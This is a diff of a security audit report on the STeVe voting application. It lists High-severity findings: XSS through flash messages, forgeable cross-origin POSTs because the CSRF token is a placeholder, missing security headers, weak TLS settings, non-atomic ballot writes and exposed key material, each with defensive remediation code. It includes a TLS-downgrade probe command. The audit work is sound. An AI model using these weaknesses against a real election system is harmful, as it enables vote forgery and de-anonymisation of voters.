-1. Configure `APP.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024` (10 MB max upload) in application configuration. 2. In any file upload handler, implement file size validation by seeking to end of file, checking size against MAX_FILE_SIZE constant, and rejecting files exceeding the limit with HTTP 413 status. 3. Reset file pointer after size check before processing.
+Replace innerHTML with DOM manipulation using textContent: `function makeItem(candidate, rank) { const div = document.createElement('div'); div.className = 'stv-item'; div.dataset.label = candidate.label; if (rank) div.dataset.rank = rank; const handle = document.createElement('span'); handle.className = 'drag-handle bi bi-grip-vertical'; const nameSpan = document.createElement('span'); nameSpan.className = 'cand-name'; nameSpan.textContent = candidate.name;  // Safe text rendering div.appendChild(handle); div.appendChild(nameSpan); div.addEventListener('dblclick', () => moveItem(div)); return div; }`
 
 ---
 
-#### FINDING-050: Missing file extension and content validation in document serving endpoint
+#### FINDING-036: XSS via Unescaped Flash Messages
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
 | **ASVS Level(s)** | L1 |
 | **CWE** | N/A |
-| **ASVS Sections** | 5.2.2, 5.3.1 |
-| **Files** | v3/server/pages.py:560-574 |
-| **Source Reports** | 5.2.2.md, 5.3.1.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Sections** | 3.2.2 |
+| **Files** | v3/server/templates/flashes.ezt:1-6, v3/server/pages.py:489, v3/server/pages.py:547, v3/server/pages.py:570, v3/server/pages.py:589, v3/server/pages.py:453, v3/server/pages.py:465 |
+| **Source Reports** | 3.2.2.md |
+| **Related Findings** | None |
 
-The `serve_doc` endpoint serves files from the filesystem without any validation of file extension or content type. The `docname` parameter is passed directly to `send_from_directory` with no check that: 1. The file extension matches an allowlist of permitted types 2. The file content (magic bytes) matches the extension 3. The file is safe for the end-user to download. The comment `### verify the propriety of DOCNAME.` explicitly acknowledges this gap. Without extension allowlisting and content validation, the application could serve polyglot files, HTML/SVG with embedded scripts (leading to stored XSS), or files masquerading as safe types (e.g., `.pdf` containing HTML).
+**Description:**
+
+User form input (election titles, issue titles) flows through flash_success() into session storage, then get_flashed_messages(), and is rendered via [flashes.message] in template without escaping as raw HTML. Multiple flash message sources in pages.py include user input without sanitization, including form.title and iid values.
 
 **Remediation:**
 
-Implement file extension allowlisting against a whitelist of permitted extensions (e.g., .pdf, .txt, .png, .jpg, .jpeg). Validate file content using magic bytes verification (python-magic library) to ensure the detected MIME type matches the expected MIME type for the file extension. Add security headers: X-Content-Type-Options: nosniff and Content-Disposition: attachment. Verify that the file is not a symlink before serving.
+Either HTML-escape flash messages in the template: `[for flashes] <div class="alert alert-[flashes.category] alert-dismissible fade show" role="alert"> [format "html"][flashes.message][end] <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button> </div> [end]` Or sanitize input before passing to flash functions: `from markupsafe import escape; await flash_success(f'Created election: {escape(form.title)}')`
 
 ---
 
-#### FINDING-051: No logging inventory or documentation exists for the application stack
+#### FINDING-037: Missing Cookie Secure Attribute and Prefix Configuration
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
+| **ASVS Level(s)** | L1, L2 |
 | **CWE** | N/A |
-| **ASVS Sections** | 16.1.1 |
-| **Files** | v3/server/bin/tally.py:165, v3/server/pages.py:37, v3/steve/election.py:27 |
-| **Source Reports** | 16.1.1.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Sections** | 3.3.1, 3.3.2 |
+| **Files** | v3/server/pages.py:null, v3/server/main.py:null |
+| **Source Reports** | 3.3.1.md, 3.3.2.md |
+| **Related Findings** | None |
 
-The application uses Python's standard logging module across three layers (web pages, election library, CLI tools) but no logging inventory document exists defining: What events are logged at each layer, the log format specification, where logs are stored (file, syslog, SIEM), how log access is controlled, log retention periods, and how logs are consumed for monitoring/alerting. The logging.basicConfig(level=logging.INFO) in tally.py sends to stderr by default. The web layer (pages.py) relies on whatever the application framework configures, which is undocumented. The election.py library logs to a logger with no explicit handler configuration.
+**Description:**
+
+No session cookie configuration is visible in the provided codebase. The application delegates session management to `asfquart.session`, but there is no evidence that cookies are configured with the `Secure` attribute or use the `__Host-` or `__Secure-` prefix. Without the `Secure` attribute, session cookies could be transmitted over unencrypted HTTP connections (e.g., if a user accesses the site via HTTP before being redirected to HTTPS, or in a man-in-the-middle scenario). Without `__Host-` or `__Secure-` prefix, cookies lack additional protections against injection from subdomains.
 
 **Remediation:**
 
-Create a LOGGING_INVENTORY.md or equivalent documentation covering: Layers, Components, Logger Names, Events Logged, Format, Destination, Retention, and Access Control. Example table provided showing Web layer (pages.py), Library layer (election.py), and CLI layer (tally.py) with JSON structured format, destinations to /var/log/steve/ and SIEM, retention of 90 days to 1 year, and access control root:adm 640.
-
----
-
-#### FINDING-052: Election library logging omits WHO (actor) metadata from security events
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.2.1 |
-| **Files** | v3/steve/election.py:207, v3/steve/election.py:219, v3/steve/election.py:231, v3/steve/election.py:430 |
-| **Source Reports** | 16.2.1.md |
-| **Related Findings** | None | **Description:**
-
-The election.py library logs creation, update, and state-change events without recording WHO performed the action. While pages.py adds user context at the handler level, the library-level logs are missing the actor (PID/UID). If the library is invoked through a different path (e.g., tally.py, future APIs, or direct imports), the WHO metadata is entirely absent. During incident investigation, it becomes impossible to correlate library-level events with the user who triggered them. This creates blind spots in the audit trail, especially for operations that bypass the web layer (CLI tools, scripts, direct database manipulation).
-
-**Remediation:**
-
-Option 1: Pass actor context to library methods (e.g., def add_issue(self, title, description, vtype, kv, actor_pid=None) and log with Actor[U:{actor_pid}]). Option 2: Use logging context via LoggerAdapter or contextvars to propagate actor identity from web handlers into election.py log messages.
-
----
-
-#### FINDING-053: Tally script performs security-critical operations without audit logging
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.2.1, 16.4.3 |
-| **Files** | v3/server/bin/tally.py:138-165 |
-| **Source Reports** | 16.2.1.md, 16.4.3.md |
-| **Related Findings** | None | **Description:**
-
-The tally script decrypts all votes for an election—one of the most sensitive operations in the system—without logging WHO (which administrator ran the tally), WHEN (timestamp of tally execution), WHERE (from which machine/terminal), or WHAT (which election was tallied, whether --spy-on-open-elections was used). The --spy-on-open-elections flag is especially concerning as it enables viewing votes before an election closes, and its use is not logged at all. An administrator could spy on open election results without any audit trail. Tamper detection events are output via print() rather than formal security logging, meaning they may not reach monitoring systems.
-
-**Remediation:**
-
-Add audit logging for tally operations before outputting results. Example:
+Configure session cookie security in the application initialization:
 
 ```python
-_LOGGER.info(f'User tallied election[E:{election.eid}], {len(results)} issues, {len(all_voters)} voters participated')
+def create_app():
+    app = asfquart.construct('steve', app_dir=THIS_DIR, static_folder=None)
+    
+    # Configure session cookie security
+    app.config['SESSION_COOKIE_SECURE'] = True
+    app.config['SESSION_COOKIE_HTTPONLY'] = True
+    app.config['SESSION_COOKIE_NAME'] = '__Host-session'  # or '__Secure-session'
+    
+    import pages
+    import api
+    return app
 ```
 
-Log who performed the tally, when it was performed, and what election was tallied to create an audit trail for sensitive tally operations.
+Note: If `asfquart` handles this internally with secure defaults, verify the framework configuration. Given the critical nature of session cookies for a voting system, explicit configuration is recommended.
 
----
-
-#### FINDING-054: Debug print statements dump complete form data which may contain sensitive election configuration
+#### FINDING-038: No Strict-Transport-Security (HSTS) header configured
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.2.5 |
-| **Files** | v3/server/pages.py:427, v3/server/pages.py:449 |
-| **Source Reports** | 16.2.5.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟠 High |
+| ASVS Level(s) | L1, L2 |
+| CWE | - |
+| ASVS Sections | 3.4.1 |
+| Files | v3/server/main.py (entire file), v3/server/pages.py (entire file) |
+| Source Reports | 3.4.1.md |
+| Related Findings | - |
+
+**Description:**
+
+No Strict-Transport-Security (HSTS) header is configured anywhere in the application. Despite TLS being configured in `config.yaml.example`, there is no `@APP.after_request` handler, middleware, or framework configuration that adds an HSTS header to responses. This is a Type A gap — the control is completely absent. Without HSTS, SSL stripping attacks are possible on initial connections, users can be downgraded from HTTPS to HTTP by a network attacker, and this is especially critical for a voting application where ballot integrity and voter authentication depend on transport security. ASVS Level 2 requires `includeSubDomains` directive which is also missing.
+
+**Remediation:**
+
+Add after_request handler in pages.py or main.py:
+```python
+@APP.after_request
+async def add_security_headers(response):
+    # HSTS: 1 year minimum, include subdomains for L2
+    response.headers['Strict-Transport-Security'] = (
+        'max-age=31536000; includeSubDomains'
+    )
+    return response
+```
+
+---
+
+#### FINDING-039: No Content-Security-Policy header configured
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2, L3 |
+| CWE | CWE-1021 |
+| ASVS Sections | 3.4.3, 3.4.7 |
+| Files | v3/server/main.py (entire file), v3/server/pages.py (entire file), v3/server/templates/header.ezt (entire file), v3/server/templates/admin.ezt (entire file), v3/server/templates/manage.ezt (entire file), v3/server/templates/vote-on.ezt (entire file), v3/server/templates/voter.ezt (entire file), v3/server/templates/flashes.ezt (entire file) |
+| Source Reports | 3.4.3.md, 3.4.7.md |
+| Related Findings | - |
+
+**Description:**
+
+No Content-Security-Policy (CSP) header is configured anywhere in the application. This is a Type A gap — the control is completely absent. The application serves HTML pages with extensive inline JavaScript (in manage.ezt, manage-stv.ezt, vote-on.ezt, voter.ezt, admin.ezt) and loads external resources, but has no CSP to restrict script execution sources. Without CSP, there is no defense-in-depth against XSS — any injection becomes script execution. The voting application handles sensitive election operations (vote casting, election management). The ASVS minimum requirement of object-src 'none'; base-uri 'none' is not met. For L2, allowlist or nonce-based script-src is required. Missing object-src 'none' allows Flash/Java plugin attacks. Missing base-uri 'none' allows base tag injection to hijack relative URLs.
+
+**Remediation:**
+
+Add after_request handler to set CSP header with report-uri and report-to directives, and implement CSP violation report endpoint:
+```python
+@app.after_request
+async def set_security_headers(response):
+    csp = (
+        "frame-ancestors 'none'; "
+        "default-src 'self'; "
+        "report-uri /csp-report; "
+        "report-to csp-endpoint"
+    )
+    response.headers['Content-Security-Policy'] = csp
+    response.headers['Reporting-Endpoints'] = 'csp-endpoint="/csp-report"'
+    return response
+
+@app.post('/csp-report')
+async def csp_report():
+    report = await quart.request.get_json(force=True)
+    _LOGGER.warning(f'CSP violation: {report}')
+    return '', 204
+```
+
+---
+
+#### FINDING-040: Missing X-Content-Type-Options: nosniff header on all HTTP responses
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2, L3 |
+| CWE | - |
+| ASVS Sections | 3.4.4, 13.4.7 |
+| Files | v3/server/main.py (application-wide), v3/server/pages.py (all route handlers) |
+| Source Reports | 3.4.4.md, 13.4.7.md |
+| Related Findings | - |
+
+**Description:**
+
+There is no middleware, after_request handler, or framework configuration in any of the provided source files that adds the X-Content-Type-Options: nosniff header to HTTP responses. This applies to all endpoints: HTML pages (home_page, voter_page, manage_page, etc.), static files served via serve_static(), and document files served via serve_doc(). Without this header, a browser may MIME-sniff the response body and interpret it as a different content type (e.g., treating a text file as executable JavaScript), enabling content-type confusion attacks. The /docs/&lt;iid&gt;/&lt;docname&gt; endpoint is particularly at risk as it serves user-uploaded documents.
+
+**Remediation:**
+
+Add after_request handler to set X-Content-Type-Options: nosniff header on all responses. Example: @app.after_request async def security_headers(response): response.headers['X-Content-Type-Options'] = 'nosniff'; return response
+
+---
+
+#### FINDING-041: Missing Content-Security-Policy frame-ancestors directive enables clickjacking attacks
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 3.4.6 |
+| Files | v3/server/main.py (application-wide), v3/server/pages.py (all HTML-rendering routes) |
+| Source Reports | 3.4.6.md |
+| Related Findings | - |
+
+**Description:**
+
+No Content-Security-Policy header with a frame-ancestors directive is set on any HTTP response. There is also no X-Frame-Options header (which is noted as obsolete in the requirement but would provide backward compatibility). This affects all page endpoints: /, /voter, /admin, /manage/&lt;eid&gt;, /vote-on/&lt;eid&gt;, etc. An attacker can embed any page from this application in an iframe on their malicious site, enabling clickjacking attacks. This is particularly critical for the voting interface (/vote-on/&lt;eid&gt;) where an attacker could overlay transparent iframes to trick users into submitting votes.
+
+**Remediation:**
+
+Add an after_request handler to set the Content-Security-Policy header with frame-ancestors directive:
+
+```python
+@app.after_request
+async def set_security_headers(response):
+    response.headers['Content-Security-Policy'] = "frame-ancestors 'none'"
+    return response
+```
+
+---
+
+#### FINDING-042: Sensitive POST Endpoints Accept CORS-Safelisted Content Types Without Preflight Protection
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L1 |
+| CWE | - |
+| ASVS Sections | 3.5.2 |
+| Files | v3/server/pages.py (405), v3/server/pages.py (451), v3/server/pages.py (507), v3/server/pages.py (529), v3/server/pages.py (551) |
+| Source Reports | 3.5.2.md |
+| Related Findings | - |
+
+**Description:**
+
+All sensitive POST endpoints consume application/x-www-form-urlencoded form data, which is a CORS-safelisted content type. Requests with this content type do NOT trigger a CORS preflight check. Combined with the non-functional CSRF token (basic.csrf_token = 'placeholder' with no server-side validation), cross-origin requests to these endpoints will be processed by the server. The application has no Origin header validation, custom header requirement, validated CSRF token, or Content-Type: application/json enforcement on form endpoints. An attacker can forge cross-origin requests to cast votes, create elections, add/edit/delete issues on behalf of an authenticated user who visits a malicious page.
+
+**Remediation:**
+
+Implement Origin header validation to verify the Origin header matches the expected application origin. Alternatively, require a custom header that forces preflight (e.g., X-Requested-With). Example: Create a validate_origin() function that checks the Origin header against allowed_origins and aborts with 403 if invalid. Or use a before_request hook to check for custom headers on POST/PUT/DELETE/PATCH requests.
+
+---
+
+#### FINDING-043: No Cross-Origin-Resource-Policy Response Header on Any Endpoint
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 3.5.8 |
+| Files | v3/server/pages.py |
+| Source Reports | 3.5.8.md |
+| Related Findings | - |
+
+**Description:**
+
+No Cross-Origin-Resource-Policy (CORP) header is set on any response throughout the application. All endpoints including serve_static(), serve_doc(), and template-rendered responses lack this defensive header. Without CORP headers, the browser cannot block cross-origin resource loads. External pages can embed resources like &lt;script src="https://steve.example.org/static/js/steve.js"&gt; to probe application JavaScript structure, or use &lt;img&gt; tags to determine authenticated state via resource load timing. Static resources expose application structure; authenticated resources expose sensitive data.
+
+**Remediation:**
+
+Add an @APP.after_request handler to set security headers on all responses. Set Cross-Origin-Resource-Policy: same-origin to restrict resources to same-origin only. Also add Cross-Origin-Opener-Policy: same-origin to block cross-origin opener/embedder access. Example: create security_headers() function decorated with @APP.after_request that adds response.headers['Cross-Origin-Resource-Policy'] = 'same-origin' and response.headers['Cross-Origin-Opener-Policy'] = 'same-origin'.
+
+---
+
+#### FINDING-044: No Strict-Transport-Security Header Configuration and No HSTS Preload
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L3, L2 |
+| CWE | - |
+| ASVS Sections | 3.7.4, 3.7.5 |
+| Files | v3/server/pages.py (entire file), v3/server/main.py (entire file), v3/server/config.yaml.example |
+| Source Reports | 3.7.4.md, 3.7.5.md |
+| Related Findings | - |
+
+**Description:**
+
+Client connects → server responds without `Strict-Transport-Security` header → browser does not enforce HTTPS → domain not on HSTS preload list → first-connection vulnerable to downgrade. Without HSTS preload, the very first connection to the application can be intercepted via SSL stripping attacks. For a voting application handling ballot submissions, this could allow an attacker to intercept votes, session cookies, or serve a fraudulent voting page. The configuration explicitly allows plain HTTP operation (`leave these two fields blank for plain HTTP`).
+
+**Remediation:**
+
+Add HSTS header to all responses using @APP.after_request decorator with 'Strict-Transport-Security: max-age=63072000; includeSubDomains; preload'. Additionally: (1) Submit the domain to https://hstspreload.org for inclusion in browser preload lists, (2) Remove the option for plain HTTP operation in production configurations, (3) Add configuration validation that rejects missing TLS certificates in production mode.
+
+---
+
+#### FINDING-045: No Browser Feature Detection or User Warning
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 3.7.5 |
+| Files | v3/server/templates/header.ezt (all), v3/server/templates/footer.ezt (all), v3/server/templates/vote-on.ezt (all), v3/server/templates/manage.ezt (all), v3/server/pages.py (all) |
+| Source Reports | 3.7.5.md |
+| Related Findings | - |
+
+**Description:**
+
+The application uses modern browser features that are critical for its security and functionality but provides no detection mechanism or warning when these features are unavailable. Required browser features used without detection include: JavaScript (ES6+) with arrow functions, template literals, const/let, destructuring, Set, Array.from(); Fetch API used in manage.ezt for AJAX date saving; SortableJS/Drag-and-Drop critical for STV vote ranking in vote-on.ezt; and Bootstrap 5 JavaScript for modals, toasts, tabs required for all user interactions. Users with JavaScript disabled see a non-functional page with no explanation. Browsers lacking Fetch API will fail silently on date operations. STV vote ranking requires SortableJS and Drag-and-Drop API - failure means votes cannot be cast. An election system where some voters cannot participate due to browser incompatibility undermines democratic integrity.
+
+**Remediation:**
+
+Add &lt;noscript&gt; block immediately after &lt;body&gt; in header.ezt with alert informing users that JavaScript is required and listing minimum browser versions (Chrome 80+, Firefox 78+, Safari 14+, Edge 80+). Implement feature detection script in &lt;head&gt; of header.ezt that checks for required features (fetch, Promise, Symbol, CSS Flexbox) and displays prominent warning when missing. Create DOMContentLoaded event handler that inserts warning div at top of page listing missing features and instructing users to update their browser.
+
+---
+
+#### FINDING-046: Multi-Vote Submission Not Wrapped in Transaction — Partial Failure Leaves Inconsistent State
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | CWE-662 |
+| ASVS Sections | 2.3.3 |
+| Files | v3/server/pages.py (372) |
+| Source Reports | 2.3.3.md |
+| Related Findings | FINDING-047, FINDING-147 |
+
+**Description:**
+
+User submits ballot with 10 issues → Loop processes votes one by one → Vote #5 fails → Votes #1-4 already committed → User told "error" but partial votes persist. Atomic ballot submission is not guaranteed. A voter's intent is a complete ballot, but partial submission creates an inconsistent state where some issues have new votes and others retain old votes. This violates the principle that business operations should succeed entirely or roll back.
+
+**Remediation:**
+
+Wrap all votes in a single transaction. Use BEGIN TRANSACTION before the loop, COMMIT after successful completion, and ROLLBACK on any exception. Example: election.db.conn.execute('BEGIN TRANSACTION') try: for iid, votestring in votes.items(): if iid not in issue_dict: election.db.conn.execute('ROLLBACK') await flash_danger(f'Invalid issue ID: {iid}') return quart.redirect(f'/vote-on/{election.eid}', code=303) election.add_vote(result.uid, iid, votestring) election.db.conn.execute('COMMIT') except Exception as e: election.db.conn.execute('ROLLBACK') await flash_danger('Error submitting votes. No changes were saved.') return quart.redirect(f'/vote-on/{election.eid}', code=303)
+
+---
+
+#### FINDING-047: Election Open Operation Not Fully Atomic — Salt Addition and State Change in Separate Transactions
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | CWE-662 |
+| ASVS Sections | 2.3.3 |
+| Files | v3/steve/election.py (70) |
+| Source Reports | 2.3.3.md |
+| Related Findings | FINDING-046, FINDING-147 |
+
+**Description:**
+
+The open() method executes add_salts() which commits its own transaction, then performs c_open.perform() in a separate auto-commit transaction. If an error occurs between add_salts() completing and c_open.perform() succeeding (e.g., disk full, power loss, exception in gather_election_data), the mayvote table has salts set (indicating an opened election) but the election record still shows editable state. Attempting to open again would regenerate salts, invalidating any votes that might have been cast in the interim. The election open operation is not atomic, leaving the database in an inconsistent state that cannot be trivially recovered.
+
+**Remediation:**
+
+Wrap the entire open() operation in a single transaction: self.db.conn.execute('BEGIN TRANSACTION') try: self.q_all_issues.perform(self.eid) for mayvote in self.q_all_issues.fetchall(): salt = crypto.gen_salt() self.c_salt_mayvote.perform(salt, mayvote.rowid) edata = self.gather_election_data(pdb) salt = crypto.gen_salt() opened_key = crypto.gen_opened_key(edata, salt) self.c_open.perform(salt, opened_key, self.eid) self.db.conn.execute('COMMIT') except Exception: self.db.conn.execute('ROLLBACK') raise
+
+---
+
+#### FINDING-048: No Explicit Locking on Election State Transitions — Race Condition on Concurrent Open/Close
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | CWE-367 |
+| ASVS Sections | 2.3.4 |
+| Files | v3/steve/election.py (70), v3/steve/election.py (109) |
+| Source Reports | 2.3.4.md |
+| Related Findings | - |
+
+**Description:**
+
+The application performs a check-then-act pattern without proper locking in the open() and close() methods. Request A checks is_editable() → True → begins add_salts(). Request B checks is_editable() → True (state not yet changed) → begins add_salts(). Both proceed to open the election with different salts/keys. While SQLite's implicit write serialization may prevent actual data corruption in single-writer scenarios, the application logic does not handle the concurrency case explicitly. In multi-process deployments or with WAL mode, race conditions could lead to: double salt generation (overwriting previous salts), multiple opened_key values being computed, and inconsistent anti-tamper state.
+
+**Remediation:**
+
+Use a single transaction with an immediate lock. Re-check state inside the transaction (with lock held). Wrap all operations in BEGIN IMMEDIATE...COMMIT with proper rollback handling. Example: self.db.conn.execute('BEGIN IMMEDIATE'); re-check state; perform all operations atomically; self.db.conn.execute('COMMIT').
+
+---
+
+#### FINDING-049: TLS Protocol Version Not Explicitly Configured
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L1 |
+| CWE | - |
+| ASVS Sections | 12.1.1 |
+| Files | v3/server/main.py (75-78) |
+| Source Reports | 12.1.1.md |
+| Related Findings | - |
+
+**Description:**
+
+The application starts with whatever TLS versions the underlying framework (Quart/Hypercorn) defaults to. Without explicit configuration, older TLS versions (TLS 1.0, TLS 1.1) may be negotiable depending on the runtime environment and library versions. Config values are passed directly to app.runx() without any TLS protocol version constraints. An attacker can attempt handshake with deprecated TLS versions using openssl s_client -connect localhost:58383 -tls1_1. If the underlying TLS library allows deprecated TLS versions, the application may be vulnerable to known protocol-level attacks (BEAST, POODLE, etc.). Without explicit minimum version enforcement, there is no guarantee that only TLS 1.2+ is used. TLS 1.3 is not explicitly preferred.
+
+**Remediation:**
+
+Explicitly configure minimum TLS protocol version and prefer TLS 1.3. For Hypercorn (the ASGI server used in run_asgi()), configure via hypercorn.toml or programmatically: Create an SSL context with ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER), ctx.minimum_version = ssl.TLSVersion.TLSv1_2, ctx.maximum_version = ssl.TLSVersion.TLSv1_3, ctx.load_cert_chain(certfile, keyfile). For config.yaml, add server.min_tls_version: "1.2"
+
+---
+
+#### FINDING-050: No Cipher Suite Configuration - Weak Ciphers May Be Negotiated
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2, L3 |
+| CWE | - |
+| ASVS Sections | 12.1.2 |
+| Files | v3/server/main.py (75-82) |
+| Source Reports | 12.1.2.md |
+| Related Findings | - |
+
+**Description:**
+
+The application has no control over which cipher suites are enabled. Without explicit cipher suite configuration, weak ciphers may be negotiated. Depending on the Python/OpenSSL version, this could allow: Non-forward-secrecy ciphers (e.g., RSA key exchange), Weak encryption algorithms (e.g., 3DES, RC4), Weak hash algorithms in cipher suites (e.g., SHA-1 based MACs). For L3 compliance, the application MUST only support cipher suites providing forward secrecy (ECDHE/DHE key exchange).
+
+**Remediation:**
+
+Create an SSL context with explicit cipher suite configuration: import ssl; def create_ssl_context(certfile, keyfile): ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.minimum_version = ssl.TLSVersion.TLSv1_2; ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS:!RC4:!3DES'); ctx.load_cert_chain(certfile, keyfile); return ctx
+
+---
+
+#### FINDING-051: TLS Configuration is Optional - Application Allows Plaintext HTTP Communication
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L1, L2, L3 |
+| CWE | - |
+| ASVS Sections | 12.2.1, 12.2.2, 12.3.1, 3.7.4 |
+| Files | v3/server/config.yaml.example (6-12), v3/server/config.yaml.example (25-31), v3/server/main.py (72-82), v3/server/main.py (80-84) |
+| Source Reports | 12.2.1.md, 12.2.2.md, 12.3.1.md, 3.7.4.md |
+| Related Findings | - |
+
+**Description:**
+
+The configuration explicitly documents that TLS can be disabled by leaving certfile and keyfile fields blank. When running without TLS, session cookies are transmitted in cleartext enabling session hijacking, OAuth tokens and credentials are exposed, vote data is transmitted unencrypted, and no mechanism exists to redirect HTTP to HTTPS. No HSTS header enforcement is visible in the code. This is a voting application handling sensitive election data—running without TLS completely undermines confidentiality and integrity.
+
+**Remediation:**
+
+Enforce TLS as mandatory by refusing to start the server without certificates. Implement HTTP-to-HTTPS redirect and HSTS headers. Example: Check if app.cfg.server.certfile or app.cfg.server.keyfile are missing and exit with error. Add @APP.before_request middleware to enforce HTTPS and @APP.after_request middleware to add Strict-Transport-Security header with max-age=31536000 and includeSubDomains. Enforce TLS at startup and fail loudly if certificates are unavailable with critical logging and sys.exit(1).
+
+---
+
+#### FINDING-052: No secrets management solution used; cryptographic keys stored directly in SQLite database
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 13.3.1 |
+| Files | v3/steve/election.py, v3/schema.sql (63-72) |
+| Source Reports | 13.3.1.md |
+| Related Findings | - |
+
+**Description:**
+
+The application stores cryptographic secrets (election salts, opened_keys, mayvote salts, encrypted vote ciphertexts) directly in an unencrypted SQLite database file. There is no key vault or secrets management solution (e.g., HashiCorp Vault, AWS KMS, Azure Key Vault), Hardware Security Module (HSM) integration, encryption at rest for the database file, or access control beyond filesystem permissions on the SQLite file. If the SQLite database file is compromised (backup theft, file system access), all cryptographic material is exposed. The opened_key (32 bytes) is the master key for vote token derivation — its compromise allows vote de-anonymization. Election salts allow regeneration of vote tokens. No audit trail for secret access.
+
+**Remediation:**
+
+Integrate a secrets management solution such as HashiCorp Vault, AWS KMS, or Azure Key Vault to store cryptographic keys separately from the database. Store sensitive key material in vault, not database. Store only references in database. Example implementation: use VaultClient to write salt and opened_key to vault at path 'secret/elections/{eid}' and retrieve them when needed rather than storing directly in SQLite. At minimum, enable SQLite encryption (SQLCipher) for the database file and add database encryption at rest.
+
+---
+
+#### FINDING-053: Cryptographic key material generated and stored without isolated security module
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 13.3.3 |
+| Files | v3/steve/crypto.py (43-95), v3/steve/election.py (70-80), v3/steve/election.py (231-243) |
+| Source Reports | 13.3.3.md |
+| Related Findings | - |
+
+**Description:**
+
+All cryptographic key material (election salts, opened_key, vote encryption keys) is generated, stored, and used entirely within the application process and a SQLite database file on disk. If the application server or database is compromised, all key material is immediately exposed. There is no hardware boundary protecting keys from memory dumps, side-channel attacks, or direct file access. Data flow: Election data → gen_opened_key() in application process memory → stored as BLOB in SQLite election table → retrieved from SQLite for vote encryption/decryption operations. An attacker with read access to the SQLite file can extract opened_key and all mayvote.salt values, then recompute vote_token for any voter/issue pair and decrypt all votes.
+
+**Remediation:**
+
+Integrate with a key management service (KMS) or HSM where cryptographic operations are performed within an isolated security boundary. Example implementation using HashiCorp Vault Transit secrets engine provided in report. Keys should never be exposed to application memory. Operations requiring keys should be delegated to the security module via API calls.
+
+---
+
+#### FINDING-054: Master election key loaded into application memory without process isolation
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 13.3.3 |
+| Files | v3/steve/election.py (144-158) |
+| Source Reports | 13.3.3.md |
+| Related Findings | - |
+
+**Description:**
+
+The opened_key (the master election key material) is loaded into application memory in multiple request paths via the _all_metadata method. The SQLite database returns SALT and OPENED_KEY columns which flow through md object to multiple methods including add_vote, tally_issue, has_voted_upon, and is_tampered. The sensitive key material is only protected by an internal comment (not for public use) with no memory protection, access control at the data layer, or process isolation.
+
+**Remediation:**
+
+Integrate with a key management service (KMS) or HSM where the key never leaves the security boundary. Operations requiring the key should be delegated to the security module via API calls. Eliminate direct loading of key material into application memory.
+
+---
+
+#### FINDING-055: Cryptographic keys and salts have no expiration or rotation mechanism
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 13.3.4 |
+| Files | v3/steve/election.py (70-80), v3/schema.sql (48-56) |
+| Source Reports | 13.3.4.md |
+| Related Findings | - |
+
+**Description:**
+
+Cryptographic keys and salts have no configured expiration or rotation mechanism. Once an election is closed, its key material remains in the database indefinitely, increasing the window for key compromise. The crypto.gen_salt() generates salt stored in election table that never expires or rotates. The crypto.gen_opened_key() generates opened_key stored in election table that persists through open to closed states indefinitely. Even the mayvote.salt values persist forever. If any key is compromised (e.g., through backup theft), there is no mechanism to detect staleness or force rotation. An attacker obtaining an old database backup can decrypt votes from elections that ended months or years ago, since no keys have been rotated or marked expired.
+
+**Remediation:**
+
